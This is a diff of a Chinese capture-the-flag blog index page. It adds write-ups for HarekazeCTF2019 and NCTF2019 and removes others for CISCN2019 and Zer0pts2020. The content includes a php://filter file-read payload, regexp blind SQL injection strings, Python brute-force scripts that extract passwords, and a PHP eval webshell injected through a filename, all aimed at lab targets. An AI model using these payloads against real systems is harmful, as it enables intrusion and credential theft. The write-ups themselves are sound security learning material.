@@ -71,6 +71,108 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-105" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/08/13/page-105/" class="article-date">
+  <time class="dt-published" datetime="2021-08-13T09:37:21.000Z" itemprop="datePublished">2021-08-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/08/13/page-105/">HarekazeCTF2019encode_and_encode</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>给了源码 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  show_source(__FILE__);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($str) &#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    // no path traversal</span><br><span class="line">    &#x27;\.\.&#x27;,</span><br><span class="line">    // no stream wrapper</span><br><span class="line">    &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;,</span><br><span class="line">    // no data exfiltration</span><br><span class="line">    &#x27;flag&#x27;</span><br><span class="line">  ];</span><br><span class="line">  $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;;</span><br><span class="line">  if (preg_match($regexp, $str)) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$json = json_decode($body, true);</span><br><span class="line"></span><br><span class="line">if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123;</span><br><span class="line">  $page = $json[&#x27;page&#x27;];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  if (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  $content = &#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// no data exfiltration!!!</span><br><span class="line">$content = preg_replace(&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);</span><br><span class="line">echo json_encode([&#x27;content&#x27; =&gt; $content]); </span><br></pre></td></tr></table></figure>
+
+<p>构造<strong>假的json和配合php伪协议 即可读取flag</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;page&quot; : </span><br><span class="line">&quot;php://filter/convert.base64-encode/resource=/flag&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就是这么个格式就可以但是<strong>php这被过掉了</strong> 需要知道一点json中可以将<strong>\uxxxx</strong>转义成字符<br>php-&gt;\u0070\u0068\u0070<br>flag-&gt;\u0066\u006c\u0061\u0067 就可以了</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/198.PNG?raw=true" alt="198.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/08/13/page-105/" data-id="cksyl7wiz000aw4w7h4u9h229" data-title="HarekazeCTF2019encode_and_encode" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-104" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/08/13/page-104/" class="article-date">
+  <time class="dt-published" datetime="2021-08-13T09:37:17.000Z" itemprop="datePublished">2021-08-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/08/13/page-104/">NCTF2019SQLi</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>按照惯例 先扫后后台 <strong>一个robots.txt  叫我们访问hint.txt</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure>
+
+<p>给了<strong>黑名单 和拿flag</strong>的条件 会的盲注用的函数都给滤掉了<br>只好看别人的了  这题得用<strong>regexp进行盲注</strong> 因为他没被过滤<br>regexp 和 like 差不多的用法 效果也差不多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">只不过 like 用%规定以什么开头的或者结尾的  regexp 以什么开头用^ 以什么结尾用$ 含有某字母的直接什么都不用</span><br><span class="line">但是regexp有别的功能 “|” 替代 OR 且不需要空格 </span><br><span class="line">regexp &#x27;a|b|c&#x27; 搜索效果相当与 where *** like &#x27;%a&#x27; or *** like &#x27;%b&#x27; or *** like &#x27;%c&#x27; ; 简洁多了</span><br><span class="line"></span><br><span class="line">用[ ] 中括号来囊括多个搜索条件</span><br><span class="line">例如[a]d 会查找含有a d的 d[a] da的</span><br><span class="line">搜索结果会包含括号中每个元素与括号外的元素构成的任一结合 </span><br><span class="line">使用短横线 来进行范围匹配 比如[a-d]d 相当于[abcd]d</span><br></pre></td></tr></table></figure>
+
+<p>用regexp思路和bool注入一样 一位一位爆破 只不过bool以位为单位 regexp以字符串为单位</p>
+<p>要爆破的username 正常来说是admin 但是输入username会弹出hacker 过滤太多了<br><strong>单引号注释符都过滤了 而且又是字符型没法闭合引号</strong> passwd也是 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单引号可以使用\来转义 and前面的单引号 造成&#x27;\&#x27; and passwd=&#x27; 形成闭合</span><br><span class="line">构造passwd为||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</span><br><span class="line">即username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</span><br></pre></td></tr></table></figure>
+
+<p>但是不能直接输入框那提交不然会变成被url编码成%2500</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/192.PNG?raw=true" alt="192.PNG"></p>
+<p>抓包修改成%00 会提示让我们访问welcome.php</p>
+<p>走脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from urllib import parse</span><br><span class="line">import string</span><br><span class="line">url = &#x27;http://bc937545-f6a5-4925-94cf-649688eb59a8.node4.buuoj.cn:81/&#x27;</span><br><span class="line">num = 0 </span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">string= string.ascii_lowercase + string.digits + &#x27;_&#x27; #密码由小写字母 数字 下划线组成(实验证明</span><br><span class="line">for i in range (1,60):</span><br><span class="line">    if num == 1 :</span><br><span class="line">        break</span><br><span class="line">    for j in string:</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;username&quot;:&quot;\\&quot;,#&quot;\&quot;转义&quot;\&quot;</span><br><span class="line">            &quot;passwd&quot;:&quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;.format((result+j),parse.unquote(&#x27;%00&#x27;))</span><br><span class="line">        &#125;</span><br><span class="line">        print(result+j)</span><br><span class="line">        res = requests.post(url=url,data=data)</span><br><span class="line">        if &#x27;welcome&#x27; in res.text:</span><br><span class="line">            result += j</span><br><span class="line">            break</span><br><span class="line">        if j==&#x27;_&#x27; and &#x27;welcome&#x27; not in res.text:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>爆出密码 登录即可</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/193.PNG?raw=true" alt="193.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/08/13/page-104/" data-id="cksyl7wix0008w4w73su21m0p" data-title="NCTF2019SQLi" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-103" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/08/13/page-103/" class="article-date">
@@ -582,124 +684,6 @@
 
 
   
-    <article id="post-page-95" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/08/06/page-95/" class="article-date">
-  <time class="dt-published" datetime="2021-08-06T03:58:47.000Z" itemprop="datePublished">2021-08-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/08/06/page-95/">CISCN2019 总决赛 Day2 Web1Easyweb</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>扫后台找到robots.txt</p>
-<p>提示了些信息 DIsallow*.php.bak</p>
-<p>访问image.php.bak</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;</span><br><span class="line">$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);</span><br><span class="line">$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=&quot;./&quot; . $row[&quot;path&quot;];</span><br><span class="line">header(&quot;Content-Type: image/jpeg&quot;);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>
-
-<p>测试：</p>
-<p>?id=\0&amp;path=or if(length(database())&gt;1,3,1) %23访问成功 又是得盲注了</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/151.PNG?raw=true" alt="151.PNG"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import string</span><br><span class="line">import logging</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># LOG_FORMAT = &quot;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&quot;</span><br><span class="line"></span><br><span class="line"># logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)</span><br><span class="line"></span><br><span class="line">target=&quot;http://994977fa-91b0-48fe-92c8-1e029285d13a.node4.buuoj.cn/image.php?id=\\0&#x27;&amp;path=or &quot;</span><br><span class="line">#库名</span><br><span class="line">dataStr=&quot;(database())&quot;</span><br><span class="line">#表名</span><br><span class="line">#dataStr=&quot;(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database())&quot;</span><br><span class="line">#列名</span><br><span class="line">#dataStr=&quot;(select(group_concat(column_name))from(information_schema.columns)where(table_name)=0x7573657273)&quot;</span><br><span class="line">#数据</span><br><span class="line">#dataStr=&quot;(select(group_concat(username,password))from(users))&quot;</span><br><span class="line">def binaryTest(i,cu,comparer):</span><br><span class="line">    payloads=&#x27;ascii(substr(&#123;&#125;,&#123;&#125;,1))&#123;comparer&#125;&#123;&#125;%23&#x27;</span><br><span class="line">    s=requests.get(target+payloads.format(dataStr,i,cu,comparer=comparer))</span><br><span class="line">    if &#x27;JFIF&#x27; in s.text:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def searchFriends_sqli(i):</span><br><span class="line">    l = 0</span><br><span class="line">    r = 255</span><br><span class="line">    while (l &lt;= r):</span><br><span class="line">        cu = (l + r) // 2</span><br><span class="line">        if (binaryTest(i, cu, &quot;&lt;&quot;)):</span><br><span class="line">            r = cu - 1</span><br><span class="line">        elif (binaryTest(i, cu, &quot;&gt;&quot;)):</span><br><span class="line">            l = cu + 1</span><br><span class="line">        elif (cu == 0):</span><br><span class="line">            return None</span><br><span class="line">        else:</span><br><span class="line">            return chr(cu)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;start&quot;)</span><br><span class="line">    finres=&quot;&quot;</span><br><span class="line">    i=1</span><br><span class="line">    while (True):</span><br><span class="line">        extracted_char = searchFriends_sqli(i)</span><br><span class="line">        if (extracted_char == None):</span><br><span class="line">            break</span><br><span class="line">        finres += extracted_char</span><br><span class="line">        i += 1</span><br><span class="line">        print(&quot;(+) 当前结果:&quot;+finres)</span><br><span class="line">    print(&quot;(+) 运行完成,结果为:&quot;, finres)</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p>别的大佬的脚本</p>
-<p>这边爆出表<strong>名users后的将其转为十六进制 因为过滤了单引号双引号0x7573657273</strong></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/152.PNG?raw=true" alt="152.PNG"></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/153.PNG?raw=true" alt="153.PNG"></p>
-<p>爆完数据登入<br>传文件 可以传入phtml </p>
-<p>但是提示将<strong>文件名写入日志文件中</strong></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/155.PNG?raw=true" alt="155.PNG"></p>
-<p>那就可以</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;&lt;?= @eval($_POST[&#x27;hack&#x27;]); ?&gt;&quot;  </span><br></pre></td></tr></table></figure>
-
-<p>用短标签绕过</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/156.PNG?raw=true" alt="156.PNG"></p>
-<p>蚁剑连接一下就好了</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/154.PNG?raw=true" alt="154.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/06/page-95/" data-id="cksyl7wk7002ew4w7b4ot7lq0" data-title="CISCN2019 总决赛 Day2 Web1Easyweb" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-94" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/08/06/page-94/" class="article-date">
-  <time class="dt-published" datetime="2021-08-06T03:58:45.000Z" itemprop="datePublished">2021-08-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/08/06/page-94/">Zer0pts2020Can you guess it</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这边有个random 随机数 但是这<strong>hash还要相等所以想要从这边随机数拿到flag不可能了</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">    exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>正则匹配禁了config.php 但是之后却会highlight_file()</strong><br>这边还有basename() 为了跨目录读取文件<br>访问<strong>index.php后面加上config.php</strong> </p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/147.PNG?raw=true" alt="147.PNG"></p>
-<p>因为<strong>加了basename()的原因</strong>传入highlight_file()函数的文件名就变成<strong>config.php</strong><br>绕过那个正则就可以拿到config.php<br>这个正则匹配例如config.php/  <strong>正则匹配第一行那就%0d换行绕过</strong><br>传入 index.php/config.php%0d 变成访问index.php</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/148.PNG?raw=true" alt="148.PNG"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[‘PHP_SELF’] </span><br></pre></td></tr></table></figure>
-
-<p>表示当前执行脚本的文件名当使用了<strong>PATH_INFO</strong>时这个值可控<br>尝试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用index.php/config.php?source来读取flag</span><br></pre></td></tr></table></figure>
-
-<p>正则过滤了config.php /*$/ i<br>basename() 的一个问题会将问今名开头的非ascii值去掉</p>
-<p>var_dump(basename(“xffconfig.php”)); // =&gt; config.php<br>var_dump(basename(“config.php/xff”)); // =&gt; config.php</p>
-<p>就能绕过正则 %ff?source<br>最终payload index.php/config.php%ff?source</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/149.PNG?raw=true" alt="149.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/06/page-94/" data-id="cksyl7wk6002dw4w756ufed9u" data-title="Zer0pts2020Can you guess it" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -736,6 +720,14 @@
       <ul>
         
           <li>
+            <a href="/2021/09/22/page-118/">长城杯flag保熟</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/22/page-117/">第五空间misc</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/19/page-116/">第五空间WEBFTP pklovecloud</a>
           </li>
         
@@ -745,14 +737,6 @@
         
           <li>
             <a href="/2021/09/09/page-114/">page</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-110/">一大堆的misc 很大一堆</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-109/">网鼎杯 2020 白虎组PicDown</a>
           </li>
         
       </ul>
